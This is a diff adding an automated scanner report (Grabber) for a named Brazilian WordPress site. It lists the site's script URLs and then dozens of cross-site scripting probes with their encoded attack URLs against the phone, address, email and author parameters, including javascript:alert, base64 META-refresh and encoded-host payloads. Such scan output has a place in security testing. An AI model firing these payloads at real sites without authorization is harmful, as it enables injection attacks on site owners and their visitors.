@@ -1,0 +1,370 @@
+<?xml version="1.0"?><GrabberReport>
+<spider root='http://www.megaartjf.com.br'>
+	<url type='anchor'>http://www.megaartjf.com.br</url>
+	<url type='anchor'>http://www.megaartjf.com.br/#quemsomos</url>
+	<url type='anchor'>http://www.megaartjf.com.br/#servicos</url>
+	<url type='anchor'>http://www.megaartjf.com.br/#portifolio</url>
+	<url type='anchor'>http://www.megaartjf.com.br/#contato</url>
+	<url type='anchor'>http://www.megaartjf.com.br/#</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-includes/js/jquery/jquery.js?ver=1.12.4</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/jquery.debouncedresize.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-includes/js/comment-reply.min.js?ver=4.6.1</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/boot.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/jquery.mobile.custom.min.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.utils.browser.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.menu.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/jquery.smoothscroll.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/waypoints.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/jquery.parallax-1.1.3.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/jquery.mb.YTPlayer.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.lazyload.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.loadmore.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/admin/jquery.theme.utils.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.mousewheel.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.utils.geom.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.utils.preloader.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.utils.transition.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.transform.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.utils.youtube.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/froogaloop.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.utils.vimeo.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.video.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.videoPlayer.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.utils.ticker.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.backgroundSlider.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.flare.lightbox.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.simplethumb.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.flare.lightbox.render.gallery.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.flare.lightbox.render.image.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.volo.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.volo.simpleskin.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.volo.captions.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.vario.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.vista.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/bootstrap/2.2.1/js/bootstrap.min.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.widgets.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.widgets.bslinks.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.contactForm.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.widgets.contact.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.widgets.bootstrap.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/jquery.isotope.min.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.isotope.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.widgets.isotope.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.widgets.backgroundSlider.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.widgets.volo.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.widgets.carousel.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.newsletter.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.widgets.newsletter.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.widgets.gmap.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.widgets.dynamicBackground.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.widgets.social.facebook.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.widgets.social.twitter.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.widgets.social.pinterest.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.widgets.social.google.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.scroll.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.ajaxportfolio.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/jquery.boxclick.widgets.ajaxportfolio.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/theme/js/pe/boxclick.controller.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/themes/boxbonus.theme.1.6.0/framework/js/pe/init.js?ver=1477833086</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-includes/js/wp-embed.min.js?ver=4.6.1</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/plugins/unite-gallery-lite/unitegallery-plugin/js/unitegallery.min.js?ver=4.6.1</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/plugins/unite-gallery-lite/unitegallery-plugin/themes/slider/ug-theme-slider.js?ver=4.6.1</url>
+	<url type='JavaScript'>http://www.megaartjf.com.br/wp-content/plugins/unite-gallery-lite/unitegallery-plugin/themes/tiles/ug-theme-tiles.js?ver=4.6.1</url>
+</spider>
+<sqlAttacks>
+</sqlAttacks>
+<xssAttacks>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<parameter name='phone'><IMG SRC="livescript:[code]"></IMG></parameter>
+	<type name='XSS Injection Type'>Livescript</type>
+	<result>http://www.megaartjf.com.br?phone=%3CIMG+SRC%3D%22livescript%3A%5Bcode%5D%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<parameter name='phone'><A HREF="h tt p://6&#09;6.000146.0x7.147/">XSS</A></parameter>
+	<type name='XSS Injection Type'>Mixed Encoding</type>
+	<result>http://www.megaartjf.com.br?phone=%3CA+HREF%3D%22h+tt+p%3A%2F%2F6%26%2309%3B6.000146.0x7.147%2F%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<parameter name='phone'><A HREF="//www.google.com/">XSS</A></parameter>
+	<type name='XSS Injection Type'>Protocol Resolution Bypass</type>
+	<result>http://www.megaartjf.com.br?phone=%3CA+HREF%3D%22%2F%2Fwww.google.com%2F%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<parameter name='phone'><A HREF="http://google:ha.ckers.org">XSS</A></parameter>
+	<type name='XSS Injection Type'>Firefox Lookups 3</type>
+	<result>http://www.megaartjf.com.br?phone=%3CA+HREF%3D%22http%3A%2F%2Fgoogle%3Aha.ckers.org%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<parameter name='phone'><A HREF="http://1113982867/">XSS</A></parameter>
+	<type name='XSS Injection Type'>Dword Encoding</type>
+	<result>http://www.megaartjf.com.br?phone=%3CA+HREF%3D%22http%3A%2F%2F1113982867%2F%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<type name='XSS Injection Type'>XSS Quick Test</type>
+	<result>http://www.megaartjf.com.br?phone=%27%27%3B%21--%22%3CXSS%3E%3D%26%7B%28%29%7D</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<parameter name='phone'><IMG SRC = " j a v a s c r i p t : a l e r t ( ' X S S ' ) " ></IMG></parameter>
+	<type name='XSS Injection Type'>Multiline w/Carriage Returns</type>
+	<result>http://www.megaartjf.com.br?phone=%3CIMG+SRC+%3D+%22+j+a+v+a+s+c+r+i+p+t+%3A+a+l+e+r+t+%28+%27+X+S+S+%27+%29+%22+%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<type name='XSS Injection Type'>Escaping JavaScript escapes</type>
+	<result>http://www.megaartjf.com.br?phone=%5C%22%3Balert%28%27XSS%27%29%3B%2F%2F</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<parameter name='phone'><A HREF="//google">XSS</A></parameter>
+	<type name='XSS Injection Type'>Firefox Lookups 1</type>
+	<result>http://www.megaartjf.com.br?phone=%3CA+HREF%3D%22%2F%2Fgoogle%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<parameter name='phone'><META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"></META></parameter>
+	<type name='XSS Injection Type'>META w/data:URL</type>
+	<result>http://www.megaartjf.com.br?phone=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Ddata%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<parameter name='address'><IMG SRC="livescript:[code]"></IMG></parameter>
+	<type name='XSS Injection Type'>Livescript</type>
+	<result>http://www.megaartjf.com.br?address=%3CIMG+SRC%3D%22livescript%3A%5Bcode%5D%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<parameter name='address'><A HREF="h tt p://6&#09;6.000146.0x7.147/">XSS</A></parameter>
+	<type name='XSS Injection Type'>Mixed Encoding</type>
+	<result>http://www.megaartjf.com.br?address=%3CA+HREF%3D%22h+tt+p%3A%2F%2F6%26%2309%3B6.000146.0x7.147%2F%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<parameter name='address'><A HREF="//www.google.com/">XSS</A></parameter>
+	<type name='XSS Injection Type'>Protocol Resolution Bypass</type>
+	<result>http://www.megaartjf.com.br?address=%3CA+HREF%3D%22%2F%2Fwww.google.com%2F%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<parameter name='address'><A HREF="http://google:ha.ckers.org">XSS</A></parameter>
+	<type name='XSS Injection Type'>Firefox Lookups 3</type>
+	<result>http://www.megaartjf.com.br?address=%3CA+HREF%3D%22http%3A%2F%2Fgoogle%3Aha.ckers.org%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<parameter name='address'><A HREF="http://1113982867/">XSS</A></parameter>
+	<type name='XSS Injection Type'>Dword Encoding</type>
+	<result>http://www.megaartjf.com.br?address=%3CA+HREF%3D%22http%3A%2F%2F1113982867%2F%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<type name='XSS Injection Type'>XSS Quick Test</type>
+	<result>http://www.megaartjf.com.br?address=%27%27%3B%21--%22%3CXSS%3E%3D%26%7B%28%29%7D</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<parameter name='address'><IMG SRC = " j a v a s c r i p t : a l e r t ( ' X S S ' ) " ></IMG></parameter>
+	<type name='XSS Injection Type'>Multiline w/Carriage Returns</type>
+	<result>http://www.megaartjf.com.br?address=%3CIMG+SRC+%3D+%22+j+a+v+a+s+c+r+i+p+t+%3A+a+l+e+r+t+%28+%27+X+S+S+%27+%29+%22+%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<type name='XSS Injection Type'>Escaping JavaScript escapes</type>
+	<result>http://www.megaartjf.com.br?address=%5C%22%3Balert%28%27XSS%27%29%3B%2F%2F</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<parameter name='address'><A HREF="//google">XSS</A></parameter>
+	<type name='XSS Injection Type'>Firefox Lookups 1</type>
+	<result>http://www.megaartjf.com.br?address=%3CA+HREF%3D%22%2F%2Fgoogle%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<parameter name='address'><META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"></META></parameter>
+	<type name='XSS Injection Type'>META w/data:URL</type>
+	<result>http://www.megaartjf.com.br?address=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Ddata%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<parameter name='email'><IMG SRC="livescript:[code]"></IMG></parameter>
+	<type name='XSS Injection Type'>Livescript</type>
+	<result>http://www.megaartjf.com.br?email=%3CIMG+SRC%3D%22livescript%3A%5Bcode%5D%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<parameter name='email'><A HREF="h tt p://6&#09;6.000146.0x7.147/">XSS</A></parameter>
+	<type name='XSS Injection Type'>Mixed Encoding</type>
+	<result>http://www.megaartjf.com.br?email=%3CA+HREF%3D%22h+tt+p%3A%2F%2F6%26%2309%3B6.000146.0x7.147%2F%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<parameter name='email'><A HREF="//www.google.com/">XSS</A></parameter>
+	<type name='XSS Injection Type'>Protocol Resolution Bypass</type>
+	<result>http://www.megaartjf.com.br?email=%3CA+HREF%3D%22%2F%2Fwww.google.com%2F%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<parameter name='email'><A HREF="http://google:ha.ckers.org">XSS</A></parameter>
+	<type name='XSS Injection Type'>Firefox Lookups 3</type>
+	<result>http://www.megaartjf.com.br?email=%3CA+HREF%3D%22http%3A%2F%2Fgoogle%3Aha.ckers.org%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<parameter name='email'><A HREF="http://1113982867/">XSS</A></parameter>
+	<type name='XSS Injection Type'>Dword Encoding</type>
+	<result>http://www.megaartjf.com.br?email=%3CA+HREF%3D%22http%3A%2F%2F1113982867%2F%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<type name='XSS Injection Type'>XSS Quick Test</type>
+	<result>http://www.megaartjf.com.br?email=%27%27%3B%21--%22%3CXSS%3E%3D%26%7B%28%29%7D</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<parameter name='email'><IMG SRC = " j a v a s c r i p t : a l e r t ( ' X S S ' ) " ></IMG></parameter>
+	<type name='XSS Injection Type'>Multiline w/Carriage Returns</type>
+	<result>http://www.megaartjf.com.br?email=%3CIMG+SRC+%3D+%22+j+a+v+a+s+c+r+i+p+t+%3A+a+l+e+r+t+%28+%27+X+S+S+%27+%29+%22+%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<type name='XSS Injection Type'>Escaping JavaScript escapes</type>
+	<result>http://www.megaartjf.com.br?email=%5C%22%3Balert%28%27XSS%27%29%3B%2F%2F</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<parameter name='email'><A HREF="//google">XSS</A></parameter>
+	<type name='XSS Injection Type'>Firefox Lookups 1</type>
+	<result>http://www.megaartjf.com.br?email=%3CA+HREF%3D%22%2F%2Fgoogle%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<parameter name='email'><META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"></META></parameter>
+	<type name='XSS Injection Type'>META w/data:URL</type>
+	<result>http://www.megaartjf.com.br?email=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Ddata%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<parameter name='author'><IMG SRC="livescript:[code]"></IMG></parameter>
+	<type name='XSS Injection Type'>Livescript</type>
+	<result>http://www.megaartjf.com.br?author=%3CIMG+SRC%3D%22livescript%3A%5Bcode%5D%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<parameter name='author'><A HREF="//www.google.com/">XSS</A></parameter>
+	<type name='XSS Injection Type'>Protocol Resolution Bypass</type>
+	<result>http://www.megaartjf.com.br?author=%3CA+HREF%3D%22%2F%2Fwww.google.com%2F%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<parameter name='author'><A HREF="http://google:ha.ckers.org">XSS</A></parameter>
+	<type name='XSS Injection Type'>Firefox Lookups 3</type>
+	<result>http://www.megaartjf.com.br?author=%3CA+HREF%3D%22http%3A%2F%2Fgoogle%3Aha.ckers.org%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<parameter name='author'><IMG SRC = " j a v a s c r i p t : a l e r t ( ' X S S ' ) " ></IMG></parameter>
+	<type name='XSS Injection Type'>Multiline w/Carriage Returns</type>
+	<result>http://www.megaartjf.com.br?author=%3CIMG+SRC+%3D+%22+j+a+v+a+s+c+r+i+p+t+%3A+a+l+e+r+t+%28+%27+X+S+S+%27+%29+%22+%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<parameter name='author'>\";alert('XSS');//</parameter>
+	<type name='XSS Injection Type'>Escaping JavaScript escapes</type>
+	<result>http://www.megaartjf.com.br?author=%5C%22%3Balert%28%27XSS%27%29%3B%2F%2F</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<parameter name='author'><A HREF="//google">XSS</A></parameter>
+	<type name='XSS Injection Type'>Firefox Lookups 1</type>
+	<result>http://www.megaartjf.com.br?author=%3CA+HREF%3D%22%2F%2Fgoogle%22%3EXSS%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<type name='XSS Injection Type'>Livescript</type>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<type name='XSS Injection Type'>Event Handlers List 2</type>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<type name='XSS Injection Type'>Event Handlers List 3</type>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<type name='XSS Injection Type'>Protocol Resolution Bypass</type>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<type name='XSS Injection Type'>Firefox Lookups 3</type>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<type name='XSS Injection Type'>Event Handlers List 1</type>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<type name='XSS Injection Type'>Multiline w/Carriage Returns</type>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<type name='XSS Injection Type'>Escaping JavaScript escapes</type>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://www.megaartjf.com.br</url>
+	<type name='XSS Injection Type'>Firefox Lookups 1</type>
+</xss>
+</xssAttacks>
+</GrabberReport>
